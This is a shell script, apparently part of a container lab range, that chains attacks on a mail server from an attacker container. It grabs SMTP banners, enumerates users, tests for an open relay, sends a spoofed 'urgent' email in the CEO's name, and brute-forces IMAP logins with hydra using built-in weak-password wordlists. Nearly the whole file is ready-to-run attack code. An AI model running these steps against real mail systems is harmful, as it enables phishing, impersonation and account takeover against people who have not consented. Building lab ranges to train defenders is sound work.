#!/bin/sh
set -e

# ./smtp_enum_relay.sh clab-virtual-env-attacker
# ./smtp_enum_relay.sh clab-virtual-env-attacker enterprise.com 25 143 alice@enterprise.com ceo@enterprise.com

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "SMTP Recon + Relay Abuse | nmap + swaks + hydra"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [smtp-port] [imap-port] [mail-to] [mail-from]"
    exit 0
fi

ATTACKER_CONTAINER="$1"
TARGET="${2:-enterprise.com}"             # Default target
PORT="${3:-25}"                           # Default to SMTP port
IMAP_PORT="${4:-143}"                     # Default to IMAP port
MAIL_TO="${5:-alice@enterprise.com}"      # Default recipient for spoofed mail
MAIL_FROM="${6:-ceo@enterprise.com}"      # Default spoofed sender

# https://www.kali.org/tools/nmap/
# https://www.jetmore.org/john/code/swaks/
# https://curl.se/docs/manpage.html (IMAP support)
echo "================================"
echo "Attack: SMTP Recon + Relay Abuse"
echo "Target SMTP: $TARGET:$PORT"
echo "Target IMAP: $TARGET:$IMAP_PORT"
echo "Spoofed mail: $MAIL_FROM -> $MAIL_TO"
echo "Attacker: $ATTACKER_CONTAINER"
echo "================================"


# Retrieve the SMTP banner and show all commands the server supports, reveal server software, version
# smtp-commands  -> Sends EHLO and lists all supported verbs
# smtp-ntlm-info -> Extracts domain info
echo "--- SMTP banner grab and command enumeration ---"
docker exec "$ATTACKER_CONTAINER" \
    nmap \
    --script smtp-commands,smtp-ntlm-info \
    -p "$PORT" \
    -T4 \
    -v \
    "$TARGET" || true

# Probe if specific mailboxes exist using methods:
# VRFY     -> asks the server to verify a mailbox address directly
# EXPN     -> requests expansion
# RCPT TO  -> addresses a test message
echo "--- User enumeration (VRFY / EXPN / RCPT) ---"
docker exec "$ATTACKER_CONTAINER" \
    nmap \
    --script smtp-enum-users \
    --script-args "smtp-enum-users.methods={VRFY,EXPN,RCPT},smtp-enum-users.domain=$TARGET" \
    -p "$PORT" \
    -T4 \
    "$TARGET" || true

# Accepts and forwards mail allowing the attacker to send spoofed mail through the enterprise server
# Messages then appear to originate from a trusted enterprise address
echo "--- Open relay test ---"
docker exec "$ATTACKER_CONTAINER" \
    nmap \
    --script smtp-open-relay \
    --script-args "smtp-open-relay.to=$MAIL_TO,smtp-open-relay.from=$MAIL_FROM" \
    -p "$PORT" \
    -T4 \
    "$TARGET" || true

# Send a new email using swaks (Swiss Army Knife for SMTP). Every SMTP field can be set manually, simulating a phishing attempt that appears to originate from a trusted internal account.
echo "--- Spoofed email delivery attempt (swaks) ---"
docker exec "$ATTACKER_CONTAINER" \
    swaks \
    --to "$MAIL_TO" \
    --from "$MAIL_FROM" \
    --server "$TARGET" \
    --port "$PORT" \
    --header "Subject: Urgent: Please review attached report" \
    --body "This is a spoofed message sent through an open relay. Attacker controlled." \
    || true

# Build compact username and password wordlists recovered from names commonly found in this lab environment, then run hydra against the IMAP service
echo "--- IMAP credential brute force + mailbox exfiltration ---"

# Build username wordlist - common first names, generic roles, and system accounts.
docker exec "$ATTACKER_CONTAINER" sh -c "cat > /tmp/imap_users.txt << 'WORDLIST'
admin
administrator
root
postmaster
webmaster
mail
info
support
alice
barry
clark
emma
lois
olivia
john
jane
user
guest
test
noreply
WORDLIST"

# Build password wordlist - common weak passwords + usernames as passwords
# (credential stuffing: many users reuse their username as password).
docker exec "$ATTACKER_CONTAINER" sh -c "cat > /tmp/imap_passes.txt << 'WORDLIST'
password
123456
admin
letmein
welcome
qwerty
secret
pswd
toor
changeme
administrator
root
postmaster
webmaster
mail
info
support
alice
barry
clark
emma
lois
olivia
john
jane
user
guest
test
noreply
WORDLIST"

# Always write to a new file so old runs don't pollute the results.
# -L  -> Username wordlist
# -P  -> Password wordlist
# -s  -> Port
# -t  -> Parallel tasks per host
# -V  -> Verbose: print each attempt
# -o  -> Save found credentials to file for the curl step below
echo "--- Running hydra IMAP brute force ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  rm -f /tmp/imap_found.txt
  hydra \
    -L /tmp/imap_users.txt \
    -P /tmp/imap_passes.txt \
    -s $IMAP_PORT \
    -t 64 \
    -V \
    -o /tmp/imap_found.txt \
    imap://$TARGET || true
"

echo ""
echo "--- Credentials ---"
docker exec "$ATTACKER_CONTAINER" cat /tmp/imap_found.txt 2>/dev/null || echo "(none found)"
